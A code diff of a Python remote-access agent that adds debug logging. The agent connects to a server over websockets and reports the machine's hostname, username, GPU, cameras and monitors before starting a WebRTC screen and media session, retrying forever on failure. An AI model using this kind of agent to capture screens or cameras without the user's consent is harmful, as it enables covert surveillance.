@@ -21,7 +21,7 @@ import av
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "9.3.0-LOG"
+AGENT_VERSION = "9.3.1-DEBUG"
 target_fps = 30
 
 # --- Logging System ---
@@ -170,12 +170,14 @@ def get_detailed_specs():
     try:
         gpu = "Unknown"
         try:
-            output = subprocess.check_output("wmic path win32_VideoController get name 2>NUL", shell=True).decode()
+            log("[BOOT] Querying GPU...")
+            output = subprocess.check_output("wmic path win32_VideoController get name", shell=True, timeout=5).decode()
             gpu = output.split('\n')[1].strip()
-        except: pass
+        except: gpu = "Unknown"
         
         try:
-            cam_output = subprocess.check_output('wmic path Win32_PnPEntity where "PNPClass=\'Camera\' OR PNPClass=\'Image\'" get name 2>NUL', shell=True).decode()
+            log("[BOOT] Querying Cameras...")
+            cam_output = subprocess.check_output('wmic path Win32_PnPEntity where "PNPClass=\'Camera\' OR PNPClass=\'Image\'" get name', shell=True, timeout=5).decode()
             cams = [n.strip() for n in cam_output.split('\n') if n.strip() and n.strip().lower() != "name"]
         except:
             cams = []
@@ -557,17 +559,26 @@ async def main_loop():
     while True:
         try:
             async with websockets.connect(uri) as ws:
-                print("CONNECTED TO PRO SERVER")
+                log("CONNECTED TO PRO SERVER")
                 client_id = get_client_id()
+                log(f"[BOOT] Client ID: {client_id}")
+                
+                log("[BOOT] Gathering specs...")
                 specs = get_detailed_specs()
-                # Pass monitors in specs for dashboard selection
+                log(f"[BOOT] Specs gathered for {specs.get('name')}")
+                
                 with mss.mss() as sct:
+                    log("[BOOT] Checking monitors...")
                     specs["monitors"] = [{"width": m["width"], "height": m["height"]} for m in sct.monitors]
                     specs["name"] = f"{socket.gethostname()} \\ {getpass.getuser()}"
+                    
+                    log("[BOOT] Sending client_auth...")
                     await ws.send(orjson.dumps({"type": "client_auth", "id": client_id, "specs": specs}).decode())
+                    
+                    log("[BOOT] Handshake complete. Starting session...")
                     await start_session(ws, sct, client_id)
         except Exception as e:
-            print(f"Connection failed: {e}. Retrying...")
+            log(f"Connection failed: {e}. Retrying...")
             await asyncio.sleep(5)
 
 if __name__ == "__main__":
